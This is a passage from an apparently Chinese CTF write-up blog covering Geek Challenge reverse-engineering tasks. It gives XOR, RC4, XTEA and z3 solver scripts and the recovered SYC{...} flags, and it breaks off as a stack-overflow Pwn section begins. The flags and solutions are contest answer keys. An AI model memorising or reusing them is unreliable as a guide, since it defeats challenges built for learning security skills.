class="number">9</span>,<span class="number">24</span>,<span class="number">45</span>,<span class="number">62</span>,<span class="number">60</span>,<span class="number">2</span>,<span class="number">17</span>,<span class="number">123</span>,<span class="number">39</span>,<span class="number">58</span>,<span class="number">41</span>,<span class="number">48</span>,<span class="number">96</span>,<span class="number">26</span>,<span class="number">8</span>,<span class="number">52</span>,<span class="number">63</span>,<span class="number">100</span>,<span class="number">33</span>,<span class="number">106</span>,<span class="number">122</span>,<span class="number">48</span>]</span><br><span class="line">k=<span class="built_in">list</span>(<span class="string">b&#x27;SYCLOVER\x00&#x27;</span>)</span><br><span class="line">m=[c[i]^k[i%<span class="number">8</span>]^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;H3lI0_@_new_R3vers3_Ctf3r!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="先来一道简单题"><a href="#先来一道简单题" class="headerlink" title="先来一道简单题"></a>先来一道简单题</h3><blockquote><p>欢迎来到极客大挑战，先来一道签到题热热身吧。</p></blockquote><p>gcc将汇编s文件生成目标o文件再到可执行文件：</p><p><code>gcc -c sssssssss.s -o s.o</code></p><p><code>gcc s.o -o s</code></p><p>按逻辑逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="built_in">list</span>(<span class="string">b&#x27;TTDv^jrZu`Gg6tXfi+pZojpZSjXmbqbmt.&amp;x&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">2</span>):</span><br><span class="line">    c[i]^=<span class="number">7</span></span><br><span class="line">    c[i+<span class="number">1</span>]+=<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;You_re@l1y_kn0w_how_To_revers3!&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="也许你也听jay"><a href="#也许你也听jay" class="headerlink" title="也许你也听jay"></a>也许你也听jay</h3><blockquote><p>周杰伦的歌像一把钥匙打开了回忆之门，旋律流淌中，仿佛呼吸着曾经放肆招摇的风。你能找到我的钥匙吗。(流畅访问网址可能需要代理,网站有音乐，请合理控制音量)</p></blockquote><p>替换长名字变量，逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">bb=[<span class="number">0x96</span>, <span class="number">0xa1</span>, <span class="number">0xa0</span>, <span class="number">0x9b</span>, <span class="number">0x9b</span>, <span class="number">0x5f</span>, <span class="number">0x49</span>, <span class="number">0x46</span>, <span class="number">0x85</span>, <span class="number">0x82</span>, <span class="number">0x53</span>, <span class="number">0x95</span>, <span class="number">0x7d</span>, <span class="number">0x36</span>, <span class="number">0x8d</span>, <span class="number">0x74</span>, <span class="number">0x82</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0x7a</span>, <span class="number">0x81</span>, <span class="number">0x65</span>, <span class="number">0x80</span>, <span class="number">0x6c</span>, <span class="number">0x78</span>, <span class="number">0x2f</span>, <span class="number">0x6b</span>, <span class="number">0x6a</span>, <span class="number">0x27</span>, <span class="number">0x50</span>, <span class="number">0x61</span>, <span class="number">0x38</span>, <span class="number">0x3f</span>, <span class="number">0x37</span>, <span class="number">0x33</span>, <span class="number">0xf1</span>, <span class="number">0x27</span>, <span class="number">0x32</span>, <span class="number">0x34</span>, <span class="number">0x1f</span>, <span class="number">0x39</span>, <span class="number">0x23</span>, <span class="number">0xde</span>, <span class="number">0x1c</span>, <span class="number">0x17</span>, <span class="number">0xd4</span>]</span><br><span class="line">cc=[<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3A</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0x3E</span>, <span class="number">0x3F</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x4F</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x5F</span>, <span class="number">0x60</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>, <span class="number">0x7D</span>, <span class="number">0x7E</span>, <span class="number">0x7F</span>, <span class="number">0x80</span>, <span class="number">0x81</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x84</span>, <span class="number">0x85</span>, <span class="number">0x86</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x8A</span>, <span class="number">0x8B</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>]</span><br><span class="line">dd=[<span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>, <span class="number">0x2E</span>, <span class="number">0x2D</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x27</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x22</span>, <span class="number">0x21</span>, <span class="number">0x20</span>, <span class="number">0x1F</span>, <span class="number">0x1E</span>, <span class="number">0x1D</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x18</span>, <span class="number">0x17</span>, <span class="number">0x16</span>, <span class="number">0x15</span>, <span class="number">0x14</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x11</span>, <span class="number">0x10</span>, <span class="number">0x0F</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x01</span>]</span><br><span class="line">ee=[<span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x60</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>]</span><br><span class="line"></span><br><span class="line">aa=bb[:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(aa)):</span><br><span class="line">    aa[i]-=dd[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(aa)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    cc[i]^=ee[<span class="number">51</span>]</span><br><span class="line">    aa[i]+=cc[<span class="number">47</span>+i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(aa)): </span><br><span class="line">    aa[i]^=cc[i]</span><br><span class="line">    aa[i]&amp;=<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ee)):</span><br><span class="line">    ee[i]^=dd[i+<span class="number">1</span>]</span><br><span class="line">    ee[i]-=cc[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(aa))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;https://am1re-sudo.github.io/Coisni.github.io/&#x27;</span></span><br></pre></td></tr></table></figure><p>访问链接，文字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">本来讨厌下雨的天空， 直到听有人说爱我 ” 你听不到密文，没关系，我会帮你写在下面。 Q7u+cyiOQtKHRMqZNzPpApgmTL4j+TE=</span><br><span class="line"></span><br><span class="line">“你在橱窗前凝视碑文的字眼，我却在旁静静欣赏你那张我深爱的脸” 我正愁找不到密钥，突然想起爱在西元前的英文是lovebeforeBC</span><br><span class="line"></span><br><span class="line">“我的思念，厚厚一叠”， 哼着七里香，我会拾起密钥，尝试用RC4来为解密画上句点，余晖刚好， 就像是某个晚霞清风的傍晚，校园广播刚好放起了七里香，转过楼梯拐角，又恰好对上她眉眼弯弯，笑容灿烂。</span><br></pre></td></tr></table></figure><p>有密文和key，RC4解密得到flag：<code>SYC&#123;ILIKELISTENJAYSONG&#125;</code>。</p><p>​</p><h3 id="让我康康你的调试"><a href="#让我康康你的调试" class="headerlink" title="让我康康你的调试"></a>让我康康你的调试</h3><blockquote><p>让我康康你的ida能调试吗</p></blockquote><p>RC4+xor。</p><p><code>c=945b7d04c9027aa6390798bc0d68f97e08bdbf9816f804715f1586b69884db61</code></p><p><code>key=syclover</code></p><p>cyberchef解得flag：<code>SYC&#123;we1come_t0_Geek&#39;s_3asy_rc4!&#125;</code>。</p><p>​</p><h3 id="我勒个z3啊"><a href="#我勒个z3啊" class="headerlink" title="我勒个z3啊"></a>我勒个z3啊</h3><blockquote><p>什么！竟然是数学吗，快去请z3老祖</p></blockquote><p>z3求解器求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">t=<span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ?_&#x27;</span></span><br><span class="line">c=[<span class="number">42</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">63</span>, <span class="number">63</span>, <span class="number">63</span>, <span class="number">38</span>, <span class="number">17</span>, <span class="number">10</span>, </span><br><span class="line">  <span class="number">21</span>, <span class="number">21</span>, <span class="number">14</span>, <span class="number">23</span>, <span class="number">16</span>, <span class="number">14</span>]</span><br><span class="line">key=<span class="string">&#x27;&#x27;</span>.join([t[k] <span class="keyword">for</span> k <span class="keyword">in</span> c])</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">key=<span class="built_in">list</span>(key.encode())</span><br><span class="line"></span><br><span class="line">s1=Solver()</span><br><span class="line">f=[Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">c=[<span class="number">0x19B</span>,<span class="number">0x113</span>,<span class="number">0x189</span>,<span class="number">0x1C9</span>,<span class="number">0x250</span>,<span class="number">0x536</span>,<span class="number">0x4DE</span>,<span class="number">0x1BC</span>,<span class="number">0x41B</span>,<span class="number">0x724</span>,<span class="number">0x6D0</span>,<span class="number">0x4A1</span>,<span class="number">0x645</span>,<span class="number">0x475</span>,<span class="number">0x4CA</span>,<span class="number">0x68C</span>,<span class="number">0x3E5</span>,<span class="number">0x1C7</span>,<span class="number">0x33D</span>,<span class="number">0x5B7</span>,<span class="number">0x28D</span>,<span class="number">0x244</span>,<span class="number">0x30E</span>,<span class="number">0x291</span>,<span class="number">0x271</span>,<span class="number">0x301</span>,<span class="number">0x45F</span>,<span class="number">0x46F</span>,<span class="number">0x517</span>,<span class="number">0x41E</span>,<span class="number">0x426</span>,<span class="number">0x4B5</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>,<span class="number">4</span>):</span><br><span class="line">    s1.add(f[i]+<span class="number">8</span>*f[i+<span class="number">1</span>]+<span class="number">6</span>*f[i+<span class="number">2</span>]+f[i+<span class="number">3</span>]==c[i])</span><br><span class="line">    s1.add(f[i+<span class="number">1</span>]+<span class="number">8</span>*f[i+<span class="number">2</span>]+<span class="number">6</span>*f[i+<span class="number">3</span>]+f[i]==c[i+<span class="number">1</span>])</span><br><span class="line">    s1.add(f[i+<span class="number">2</span>]+<span class="number">8</span>*f[i+<span class="number">3</span>]+<span class="number">6</span>*f[i]+f[i+<span class="number">1</span>]==c[i+<span class="number">2</span>])</span><br><span class="line">    s1.add(f[i+<span class="number">3</span>]+<span class="number">8</span>*f[i]+<span class="number">6</span>*f[i+<span class="number">1</span>]+f[i+<span class="number">2</span>]==c[i+<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(s1.check())</span></span><br><span class="line">m=s1.model()</span><br><span class="line">cc=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    cc.append(m[f[i]].as_long())</span><br><span class="line"><span class="comment">#print(cc)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s2=Solver()</span><br><span class="line">f=[BitVec(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">ff=f[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j&lt;i:</span><br><span class="line">        x=ff[<span class="number">4</span>*i]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            ff[<span class="number">4</span>*i+k]=ff[<span class="number">4</span>*i+k+<span class="number">1</span>]</span><br><span class="line">        ff[<span class="number">4</span>*i+<span class="number">3</span>]=x</span><br><span class="line">        j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    ff[i]^=ff[(<span class="number">31</span>+i)%<span class="number">32</span>]</span><br><span class="line">    ff[i]^=key[<span class="number">15</span>-i]^i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    s2.add(ff[i]==cc[i])</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(s2.check())</span></span><br><span class="line">m=s2.model()</span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    flag.append(m[f[i]].as_long())</span><br><span class="line"><span class="comment">#print(flag)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Geek___Challenge&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;Wow!!_Y0u_4r3_9o0d_At_r3$!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="ezzzz"><a href="#ezzzz" class="headerlink" title="ezzzz"></a>ezzzz</h3><blockquote><p>喝喝茶，做做题 题目附件下载链接:<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1MXYmUTyrwRtfoBntEPiBPg">https://pan.baidu.com/s/1MXYmUTyrwRtfoBntEPiBPg</a> 密码:game</p></blockquote><p>apk文件分析，关键逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">check</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Enc.encrypt(<span class="built_in">this</span>.et.getText().toString()).equals(getResources().getString(R.string.target))) &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Wow!You are right!!!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Emmmmm……wrong????&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密逻辑在 <code>Enc.encrypt()</code>，发现是带符号的xtea加密，提取密文：</p><p><code>target=f1f186b25a96c782e6c63a0b70b61b5ced6bf84889700d6b09381b5ccb2f24fab1c79e796d822d9cdcc55f760f780e750d65c4afb89084a9e978c3827a8dd81091f28df3a84dbacab4d75f75f19af8e5b90f80fcfc10a5c3d20679fb2bc734c8ccb31c921ac52ad3e7f922b72e24d923fb4ce9f53548a9e571ebc25adf38862e10059186327509463dd4d54c905abc36c26d5312d2cd42c0772d99e50cd4c4665c3178d63a7ffe71ada251c070568d5a5798c2921ec0f7fc3ae9d8418460762930ca6a2dccef51d2a1a8085491b0f82d686ca34774c52d0f0f26449fc28d362c86f3311b8adc4fb1a4497e34e0f0915d</code></p><p>用c写解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="built_in">map</span>[] = &#123;<span class="number">4059137714</span>, <span class="number">1519830914</span>, <span class="number">3871750667</span>, <span class="number">1890982748</span>, <span class="number">3983276104</span>, <span class="number">2305822059</span>, <span class="number">154671964</span>, <span class="number">3408864506</span>, <span class="number">2982649465</span>, <span class="number">1837247900</span>, <span class="number">3703922550</span>, <span class="number">259526261</span>, <span class="number">224773295</span>, <span class="number">3096478889</span>, <span class="number">3917005698</span>, <span class="number">2056116240</span>, <span class="number">2448592371</span>, <span class="number">2823666378</span>, <span class="number">3034013557</span>, <span class="number">4053465317</span>, <span class="number">3104801020</span>, <span class="number">4228949443</span>, <span class="number">3523639803</span>, <span class="number">734475464</span>, <span class="number">3434290322</span>, <span class="number">449129171</span>, <span class="number">3891864247</span>, <span class="number">774166819</span>, <span class="number">4216121845</span>, <span class="number">893954533</span>, <span class="number">1911276122</span>, <span class="number">3745023534</span>, <span class="number">268800390</span>, <span class="number">846530886</span>, <span class="number">1037358412</span>, <span class="number">2421865526</span>, <span class="number">3261944594</span>, <span class="number">3536667328</span>, <span class="number">1999477221</span>, <span class="number">215270502</span>, <span class="number">1546746070</span>, <span class="number">981466737</span>, <span class="number">2913096128</span>, <span class="number">1884720474</span>, <span class="number">1469629074</span>, <span class="number">515962876</span>, <span class="number">988403777</span>, <span class="number">2220914217</span>, <span class="number">818571821</span>, <span class="number">3438236114</span>, <span class="number">2712143956</span>, <span class="number">2444294189</span>, <span class="number">1751950151</span>, <span class="number">1959079183</span>, <span class="number">254166175</span>, <span class="number">3264034348</span>, <span class="number">2264084763</span>, <span class="number">2329694129</span>, <span class="number">2756279860</span>, <span class="number">3773862237</span>&#125;;</span><br><span class="line"><span class="type">int</span> key[] = &#123;<span class="number">71</span>, <span class="number">69</span>, <span class="number">69</span>, <span class="number">75</span>&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">int</span>* v,<span class="type">int</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; ++i)</span><br><span class="line">        sum += <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">31</span>; j&gt;=<span class="number">0</span>; --j) &#123;</span><br><span class="line">        v[<span class="number">1</span>] -= (((v[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) ^ (v[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>)) + v[<span class="number">0</span>]) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]) ^ (sum+j);</span><br><span class="line">        sum -= <span class="number">0x9E3779B9</span>;</span><br><span class="line">        v[<span class="number">0</span>] -= (((v[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) ^ (v[<span class="number">1</span>] &gt;&gt; <span class="number">5</span>)) + v[<span class="number">1</span>]) ^ (sum + key[sum &amp; <span class="number">3</span>]) ^ (sum+j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">60</span>; i+=<span class="number">2</span>)</span><br><span class="line">        decode(&amp;<span class="built_in">map</span>[i],key);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">60</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,<span class="built_in">map</span>[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SYC&#123;g0od_j0b_wweLCoMeToooSSSyC_zz_1_et3start_yoUr_j0urney!!&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="你会栈溢出吗"><a href="#你会栈溢出吗" class="headerlink" title="你会栈溢出吗"></a>你会栈溢出吗</h3><blockquote><p>超级简单的题目</p></blockquote><p>ret2text。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 